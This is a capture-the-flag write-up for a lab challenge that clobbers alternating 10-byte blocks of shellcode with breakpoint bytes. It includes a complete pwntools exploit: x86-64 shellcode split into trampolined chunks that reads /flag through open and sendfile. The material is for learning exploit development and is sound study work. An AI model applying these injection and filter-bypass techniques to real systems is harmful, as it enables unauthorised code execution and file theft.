# Writeup: /challenge/clobbercode

**Constraint**

It overwrites every other 10 bytes of our shellcode with 0xcc, starting from byte index 10. 
In x86 architecture, 0xcc is the opcode for INT 3, which triggers a breakpoint and causes a Segmentation Fault if executed.

Safe: Bytes 0-9
Clobbered (0xcc): Bytes 10-19
Safe: Bytes 20-29
Clobbered (0xcc): Bytes 30-39

...and so on.

Standard shellcode will immediately crash here. For example, simply loading the "/flag" string into a 64-bit register (mov rbx, 0x00000067616c662f) takes exactly 10 bytes, leaving zero room to jump over the upcoming clobbered zone.

**Exploit Strategy**

To bypass this, we need to split our shellcode into tiny "chunks" using a trampoline technique.

Size Limits: We can only place a maximum of 8 bytes of operational instructions in each safe zone.

The Trampoline: The remaining 2 bytes in the safe zone must be used for a short relative jump (jmp) to safely leap over the adjacent 10-byte trap into the next safe zone.

Instruction Golfing: We must optimize our assembly. Instead of using 64-bit registers (which result in longer opcodes), we use 32-bit registers like edi and esi (which automatically zero-extend to 64-bit). We also place the "/flag" string in a designated safe zone at the end and use lea with RIP-relative addressing to load it.

Alignment Magic: By utilizing the .org assembler directive, we force the assembler to pad our code perfectly, aligning each chunk to the correct safe offsets (0, 20, 40, etc.) without having to manually count nop bytes.

```
from pwn import *

# Set architecture for proper assembly compilation
context.arch = 'amd64'
context.os = 'linux'

# Trampoline shellcode using .org for automatic alignment
asm_code = """
    /* --- Chunk 1: Offset 0-9 (Safe) --- */
    lea rdi, [rip + flag_str]   /* 7 bytes: Load "/flag" address into rdi */
    jmp chunk2                  /* 2 bytes: Jump over the clobbered zone */
    
    .org 20                     /* Pad to offset 20. Bytes 10-19 will be destroyed */

chunk2:
    /* --- Chunk 2: Offset 20-29 (Safe) --- */
    xor esi, esi                /* 2 bytes: rsi = 0 (O_RDONLY) */
    push 2                      /* 2 bytes */
    pop rax                     /* 1 byte : rax = 2 (SYS_open) */
    syscall                     /* 2 bytes: Execute open("/flag", 0) */
    jmp chunk3                  /* 2 bytes: Jump over the clobbered zone */
    
    .org 40                     /* Pad to offset 40. Bytes 30-39 will be destroyed */

chunk3:
    /* --- Chunk 3: Offset 40-49 (Safe) --- */
    mov edi, 1                  /* 5 bytes: rdi = 1 (stdout) */
    mov rsi, rax                /* 3 bytes: rsi = fd (returned from open) */
    jmp chunk4                  /* 2 bytes: Jump over the clobbered zone */
    
    .org 60                     /* Pad to offset 60. Bytes 50-59 will be destroyed */

chunk4:
    /* --- Chunk 4: Offset 60-69 (Safe) --- */
    xor edx, edx                /* 2 bytes: rdx = 0 (offset) */
    mov r10d, 1000              /* 6 bytes: r10 = 1000 (bytes to read) */
    jmp chunk5                  /* 2 bytes: Jump over the clobbered zone */
    
    .org 80                     /* Pad to offset 80. Bytes 70-79 will be destroyed */

chunk5:
    /* --- Chunk 5: Offset 80-89 (Safe) --- */
    mov al, 40                  /* 2 bytes: rax = 40 (SYS_sendfile) */
    syscall                     /* 2 bytes: Execute sendfile(1, fd, 0, 1000) */
    mov al, 60                  /* 2 bytes: rax = 60 (SYS_exit) */
    syscall                     /* 2 bytes: Clean exit */
    nop
    nop
    
    .org 100                    /* Pad to offset 100. Bytes 90-99 will be destroyed */

flag_str:
    /* --- Chunk 6: Offset 100+ (Safe) --- */
    .string "/flag"             /* The string sits safely here for RIP-relative addressing */
"""

# Compile the assembly code into machine bytes
payload = asm(asm_code)
log.info(f"Payload length: {len(payload)} bytes")

# Execute the challenge and send the payload
p = process("/challenge/clobbercode")
p.send(payload)

# Receive the flag output
p.interactive()
```
